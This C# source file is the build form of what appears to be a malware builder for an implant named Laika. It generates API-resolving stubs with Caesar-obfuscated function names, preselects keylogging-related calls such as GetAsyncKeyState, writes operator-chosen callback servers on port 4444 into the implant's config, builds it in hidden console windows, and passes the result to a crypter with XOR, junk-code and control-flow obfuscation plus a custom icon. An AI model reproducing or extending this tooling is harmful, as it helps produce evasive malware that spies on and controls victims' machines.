using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.Json;

namespace Server
{ 
    public partial class BuildMenu : Form
    {
        private List<ApiInfo> apis;

        public BuildMenu()
        {
            InitializeComponent();
            LoadApis();
            SetPlaceholder();
            searchBox.GotFocus += searchBox_GotFocus;
            searchBox.LostFocus += searchBox_LostFocus;
        }

        private void SetPlaceholder()
        {
            searchBox.Text = "Search for an API";
            searchBox.ForeColor = Color.Gray;
        }

        private void searchBox_GotFocus(object sender, EventArgs e)
        {
            if (searchBox.Text == "Search for an API")
            {
                searchBox.Text = "";
                searchBox.ForeColor = Color.Black;
            }
        }

        private void searchBox_LostFocus(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(searchBox.Text))
            {
                SetPlaceholder();
            }
        }

        private void LoadApis()
        {
            string filePath = "../data/win_apis.json";
            if (File.Exists(filePath))
            {
                string jsonContent = File.ReadAllText(filePath);
                apis = JsonSerializer.Deserialize<List<ApiInfo>>(jsonContent);

                int maxItems = apis.Count;
                for (int i = 0; i < maxItems; i++)
                {
                    searchResultsListBox.Items.Add(apis[i].function_name);
                }

                Selected_apis.Items.Add("VirtualAlloc");
                Selected_apis.Items.Add("VirtualFree");
                Selected_apis.Items.Add("GetAsyncKeyState");
            }
            else
            {
                MessageBox.Show("API file not found!");
            }
        }

        private void SearchBox_TextChanged(object sender, EventArgs e)
        {
            string searchText = searchBox.Text.ToLower();
            if (searchText == "search for an api" || searchText == "")
                return;

            searchResultsListBox.Items.Clear();

            var filteredApis = apis.Where(api => api.function_name.ToLower().Contains(searchText)).ToList();

            foreach (var api in filteredApis)
            {
                searchResultsListBox.Items.Add(api.function_name);
            }
        }

        private void SearchResultsListBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (searchResultsListBox.SelectedItem != null)
            {
                string selectedFunctionName = searchResultsListBox.SelectedItem.ToString();

                if (!Selected_apis.Items.Contains(selectedFunctionName))
                {
                    Selected_apis.Items.Add(selectedFunctionName);
                }
            }
        }

        private void BuildMenu_Load(object sender, EventArgs e)
        {
            this.CenterToParent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "")
            {
                Hosts.Items.Add(textBox1.Text);
                button2.Enabled = true;
                textBox1.Clear();
            }
        }

        private void Hosts_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                int index = Hosts.IndexFromPoint(e.Location);
                if (index < 0)
                    return;

                Hosts.SelectedIndex = index;
                contextMenuStrip1.Show(Cursor.Position);
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Hosts.Items.RemoveAt(Hosts.SelectedIndex);
            if (Hosts.Items.Count == 0)
                button2.Enabled = false;
        }

        private void AppendApisToAPIC()
        {
            string filePath = "../pasm/src/api.c";
            string marker = "// generated APIs here";

            string fileContent = File.ReadAllText(filePath);

            int markerPosition = fileContent.IndexOf(marker);
            if (markerPosition == -1)
            {
                MessageBox.Show($"Marker '{marker}' not found in the file.");
                return;
            }

            string newContent = fileContent.Substring(0, markerPosition + marker.Length) + "\n";
            using (StreamWriter sw = new StreamWriter(filePath, false)) // Overwrite the file
            {
                sw.Write(newContent);

                foreach (var selectedItem in Selected_apis.Items)
                {
                    string functionName = selectedItem.ToString();
                    var api = apis.FirstOrDefault(a => a.function_name == functionName);
                    if (api == null) continue;

                    bool returnsVoid = api.full_prototype.StartsWith("void");

                    StringBuilder functionBody = new StringBuilder();
                    StringBuilder functionCallArgs = new StringBuilder();
                    StringBuilder typedefArgs = new StringBuilder();

                    for(int j = 0; j < api.arguments.Count; j++)
                    {
                        string argType = api.arguments[j];

                        typedefArgs.Append(argType);

                        if ((j + 1) < api.arguments.Count)
                        {
                            typedefArgs.Append(", ");
                        }
                    }

                    for (int i = 0; i < api.arguments.Count; i++)
                    {
                        string argName = $"arg{i}";
                        string argType = api.arguments[i];

                        functionBody.AppendLine($"    long long {argName} = state->STACK[state->STACK_IDX--];");

                        if (functionCallArgs.Length > 0)
                        {
                            functionCallArgs.Append(", ");
                        }

                        functionCallArgs.Append($"({argType}){argName}");
                    }

                    string functionCall = returnsVoid
                        ? $"{functionName}({functionCallArgs.ToString()});"
                        : $"state->registers->eax = (long long)p{functionName}({functionCallArgs.ToString()});";

                    string functionCode = $@"
#ifdef _WIN32
    typedef {api.full_prototype.Split(' ')[0]}(WINAPI *f{api.function_name})({typedefArgs.ToString()});
#endif
void api_{functionName}(void) {{
#ifdef _WIN32
    f{api.function_name} p{api.function_name} = GetApi(L""{api.dll_name}"", ""{Utils.CAESAR(api.function_name)}"");
    if (p{api.function_name} == NULL) {{
        state->STACK_IDX -= {api.arguments.Count};
        {(returnsVoid ? string.Empty : "state->registers->eax = 1;")}
        return;
    }}
{functionBody.ToString()}    {functionCall}
#else
    state->STACK_IDX -= {api.arguments.Count};
    {(returnsVoid ? string.Empty : "state->registers->eax = 1;")}
#endif
}}
";
                    sw.WriteLine(functionCode);
                }
            }
        }

        private void UpdateApiHeaderFile()
        {
            string filePath = "../pasm/src/api.h";
            string markerStart = "// generated APIs here";
            string markerEnd = "//end";

            string fileContent = File.ReadAllText(filePath);

            int startMarkerPosition = fileContent.IndexOf(markerStart);
            int endMarkerPosition = fileContent.IndexOf(markerEnd, startMarkerPosition);

            if (startMarkerPosition == -1 || endMarkerPosition == -1)
            {
                MessageBox.Show($"Markers '{markerStart}' or '{markerEnd}' not found in the file.");
                return;
            }

            string contentBeforeMarkers = fileContent.Substring(0, startMarkerPosition + markerStart.Length) + "\n";
            string contentAfterMarkers = fileContent.Substring(endMarkerPosition);

            StringBuilder prototypes = new StringBuilder();
            StringBuilder apiMapEntries = new StringBuilder();

            foreach (var selectedItem in Selected_apis.Items)
            {
                string functionName = selectedItem.ToString();
                prototypes.AppendLine($"void api_{functionName}();");

                apiMapEntries.AppendLine($"    {{.command = \"{functionName}\", .fptr = api_{functionName}}},");
            }

            string newContent = contentBeforeMarkers + prototypes.ToString() + "\n" + contentAfterMarkers;

            int apiMapStartMarkerPosition = newContent.IndexOf(markerStart, startMarkerPosition + markerStart.Length);
            int apiMapEndMarkerPosition = newContent.IndexOf(markerEnd, apiMapStartMarkerPosition);

            string newApiMapContent = newContent.Substring(0, apiMapStartMarkerPosition + markerStart.Length) + "\n" +
                                      apiMapEntries.ToString() + "\n" +
                                      newContent.Substring(apiMapEndMarkerPosition);

            File.WriteAllText(filePath, newApiMapContent);

        }

        private void button2_Click(object sender, EventArgs e)
        {
            string output = "";

            button2.Text = "Writing APIs to pasm...";
            button2.Update();

            AppendApisToAPIC();
            UpdateApiHeaderFile();
 
            /*
            button2.Text = "Building pasm...";
            button2.Update();

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C \"\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\"\" -nologo -latest -property installationPath";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            process.StartInfo = startInfo;
            process.Start();
            string vs_path = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
 
            vs_path = vs_path.Replace("\r\n", "");
            string cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe";

            startInfo.Arguments = "/C \"\"" + cmd_line + "\"\" ../pasm/msvc/pasm.vcxproj /p:Configuration=Release;Platform=x86 /p:LaikaBuild=true";
            startInfo.RedirectStandardError = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            output += process.StandardError.ReadToEnd();

            process.WaitForExit();

            button2.Text = "Building Laika...";
            button2.Update();

            */
            /*
            startInfo.Arguments = "/C \"\"" + cmd_line + "\"\" ../Laika /p:Configuration=Release;Platform=x86";
            startInfo.RedirectStandardError = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            output += process.StandardError.ReadToEnd();

            process.WaitForExit();
            */

            string filePath = @"..\Laika\config.h";
            string newContent = @"#define FALLBACK_SERVERS " + Hosts.Items.Count;
            newContent += "\n\nchar* fallback_servers[FALLBACK_SERVERS] = {\n";
            for (int i = 0; Hosts.Items.Count > i; i++)
            {
                newContent += "\t\"" + Utils.CAESAR(Hosts.Items[i].ToString()) + "\",\n";
            }
            newContent += "};\n\n";
            newContent += "int fallback_servers_ip[FALLBACK_SERVERS] = {\n";
            for (int j = 0; Hosts.Items.Count > j; j++)
            {
                newContent += "\t4444,\n";
            }
            newContent += "};"; 
            File.WriteAllText(filePath, newContent);

            /*
            startInfo.Arguments = "/C \"\"" + cmd_line + "\"\" ../Laika /p:Configuration=Release;Platform=x86";
            startInfo.RedirectStandardError = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            output += process.StandardError.ReadToEnd();
            process.WaitForExit();
            */

            button2.Text = "Building Laika...";
            button2.Update();

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd";
            startInfo.Arguments = "/C cd ../Laika/ && make fclean && make";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            if (!checkBox1.Checked)
            {
                File.WriteAllText("build_log.txt", output);
                button2.Text = "Done !";
                return;
            }

            string args = string.Empty;
            if (checkBox2.Checked)
                args += " --xor " + textBox2.Text;
            if (checkBox3.Checked)
                args += " --junk " + numericUpDown1.Value.ToString();
            if (checkBox4.Checked)
                args += " --control_flow " + numericUpDown2.Value.ToString();
            if (pictureBox1.ImageLocation != "" && pictureBox1.ImageLocation != null)
                args += " --icon " + pictureBox1.ImageLocation;

            startInfo.Arguments = "/C cd ..\\patate-crypter\\Builder && python gui.py --file ..\\..\\bin\\Laika.exe" + args;
            startInfo.RedirectStandardError = true;
            process.StartInfo = startInfo;
            process.Start();
            output += process.StandardOutput.ReadToEnd();
            output += process.StandardError.ReadToEnd();

            process.WaitForExit();
            File.WriteAllText("build_log.txt", output);

            button2.Text = "Done !";
        }

        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Icon files (*.ico)|*.ico",
                Title = "Select your icon"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string filePath = openFileDialog.FileName;
                pictureBox1.ImageLocation = filePath;
                pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
                pictureBox1.Update();
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            bool flag = checkBox1.Checked;
            
            checkBox2.Enabled = flag;
            checkBox3.Enabled = flag;
            checkBox4.Enabled = flag;
            pictureBox1.Enabled = flag;
            button3.Enabled = flag;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            label4.Enabled = checkBox2.Checked;
            textBox2.Enabled = checkBox2.Checked;
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            label5.Enabled = checkBox3.Checked;
            numericUpDown1.Enabled = checkBox3.Checked;
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            label6.Enabled = checkBox4.Checked;
            numericUpDown2.Enabled = checkBox4.Checked;
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Selected_apis.Items.RemoveAt(Selected_apis.SelectedIndex);
            if (Selected_apis.Items.Count == 0)
                button2.Enabled = false;
        }

        private void Selected_apis_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                int index = Selected_apis.IndexFromPoint(e.Location);
                if (index < 0)
                    return;

                Selected_apis.SelectedIndex = index;
                contextMenuStrip2.Show(Cursor.Position);
            }
        }
    }

    public class ApiInfo
    {
        public string function_name { get; set; }
        public List<string> arguments { get; set; }
        public string dll_name { get; set; }
        public string full_prototype { get; set; }
    }
}
